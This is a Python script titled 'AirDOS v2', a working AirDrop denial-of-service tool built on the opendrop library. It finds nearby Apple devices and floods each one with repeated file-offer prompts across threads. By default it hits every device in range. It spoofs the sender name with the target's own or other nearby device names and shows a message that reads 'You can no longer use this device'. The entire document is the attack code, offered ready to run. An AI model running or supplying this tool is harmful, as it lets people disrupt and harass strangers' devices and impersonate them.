#!/usr/bin/env python3
"""
AirDOS v2 by hashdashme

Based off: AirDoS by Kishan Bagaria (https://kishanbagaria.com/airdos/)
"""

import ipaddress
import json
import logging
import plistlib
import random
import threading
import time

from colorama import Fore, Back, Style

from opendrop.client import AirDropBrowser, AirDropClient
from opendrop.config import AirDropConfig, AirDropReceiverFlags

#   ==  config  ==  #

#   Name used for Airdrop sender.
SENDER_NAME = ' '

#   If true, mimicks other airdrop names or the recievers name
cloaking = True

#   Amount of threads to be used per target
threads_per_target = 1

#   Whitelist
whitelist = []


#   ==  config  ==  #

cloaking_things = []
target = input("Enter Target (blank == everyone): ") or None

#   Message to show for iOS devices.
start_new_lines = '\n' * 10
end_new_lines = '\n' * 100
FILE_NAME = f"""
{start_new_lines}
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

😈😈😈😈😈
You can no longer use this device
Have fun!

⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
{end_new_lines}
😈
"""

rand = lambda: '{0:0{1}x}'.format(random.randint(0, 0xffffffffffff), 12)
attack_counts = {}
config = AirDropConfig()
logger = logging.getLogger(__name__)

logging.basicConfig(level=logging.INFO, format=f'{Style.DIM}%(asctime)s{Style.RESET_ALL} %(message)s')

def gen_body(node_info):
    ask_body = {
        'SenderComputerName': SENDER_NAME,
        'SenderModelName': rand(),
        'SenderID': rand(),
        'BundleID': 'com.apple.finder',
        'Files': [{
            'FileName': FILE_NAME,
            'FileType': 'public.plain-text'
        }]
    }

    if cloaking == True:
        if len(cloaking_things) != 0:
            if len(cloaking_things) >= 2:
                while True:
                    ask_body['SenderComputerName'] = random.choice(cloaking_things)
                    if ask_body['SenderComputerName'] != node_info['name']:
                        break
            else:
                ask_body['SenderComputerName'] = random.choice(cloaking_things)
        else:
            ask_body['SenderComputerName'] = node_info['name']

    return ask_body

def send_ask(node_info):
    ask_body = gen_body(node_info)
    ask_binary = plistlib.dumps(ask_body, fmt=plistlib.FMT_BINARY)
    id = node_info['id']
    attack_counts[id] = attack_counts.get(id, 1) + 1
    try:
        client = AirDropClient(config, (node_info['address'], node_info['port']))
        success, _ = client.send_POST('/Ask', ask_binary)
        if success: # if user accepted
            client.send_POST('/Upload', None)
        return success
    except:
        pass

def send(node_info):
    name = node_info['name']
    id = node_info['id']
    attack_count = attack_counts.get(id, 1)
    receiver_name = Fore.GREEN + name + Fore.RESET
    logging.info(f'❔ Prompting   {receiver_name} (#{attack_count})')
    success = send_ask(node_info)
    if success == True:
        logging.info(f'✅ Accepted by {receiver_name} (#{attack_count})')
    elif success == False:
        logging.info(f'❎ Declined by {receiver_name} (#{attack_count})')
    else:
        logging.info(f'🛑 Errored     {receiver_name} (#{attack_count})')
    return success

def brute(node_info):
    error_count = 0
    while True:
        if send(node_info) == None:
            error_count += 1
            if error_count > 2:
                break

def start_brute(node_info):
    # two threads for good measure
    # this makes sure there is always another popup to decline if there is any network delay
    for i in range(threads_per_target):
        thread = threading.Thread(target=brute, args=(node_info,))
        thread.start()

def found_receiver(info):
    thread = threading.Thread(target=on_receiver_found, args=(info,))
    thread.start()

def send_discover(client):
    discover_body = {}
    discover_plist_binary = plistlib.dumps(discover_body, fmt=plistlib.FMT_BINARY)
    success, response_bytes = client.send_POST('/Discover', discover_plist_binary)
    response = plistlib.loads(response_bytes)
    return response

def on_receiver_found(info):
    try:
        address = ipaddress.ip_address(info.address).compressed
    except ValueError:
        return
    id = info.name.split('.')[0]
    hostname = info.server
    port = int(info.port)
    client = AirDropClient(config, (address, int(port)))
    flags = int(info.properties[b'flags'])

    receiver_name = None
    if flags & AirDropReceiverFlags.SUPPORTS_DISCOVER_MAYBE:
        try:
            discover = send_discover(client)
            receiver_name = discover.get('ReceiverComputerName')
        except:
            pass
    discoverable = receiver_name is not None

    node_info = {
        'name': receiver_name,
        'address': address,
        'port': port,
        'id': id,
        'flags': flags,
        'discoverable': discoverable,
    }
    if discoverable:
        additional = f'{Style.DIM}{id} {hostname} [{address}]:{port}{Style.RESET_ALL}'
        logger.info('🔍 Found       {:32}   {}'.format(Fore.GREEN + receiver_name + Fore.RESET, additional))
        if receiver_name not in whitelist and receiver_name not in cloaking_things:
            cloaking_things.append(receiver_name)
        if receiver_name in whitelist:
            logger.info('❌ Ignoring    {:32}   {}'.format(Fore.RED + receiver_name + Fore.RESET, additional))
        else:
            if target == None:
                start_brute(node_info)
            elif target in receiver_name:
                start_brute(node_info)
            else:
                logger.info('❌ Ignoring    {:32}   {}'.format(Fore.RED + receiver_name + Fore.RESET, additional))


logger.info('⏳ Looking for devices... Open Finder -> AirDrop')
browser = AirDropBrowser(config)
browser.start(callback_add=found_receiver)
try:
    input()
except KeyboardInterrupt:
    pass
finally:
    if browser is not None:
        browser.stop()
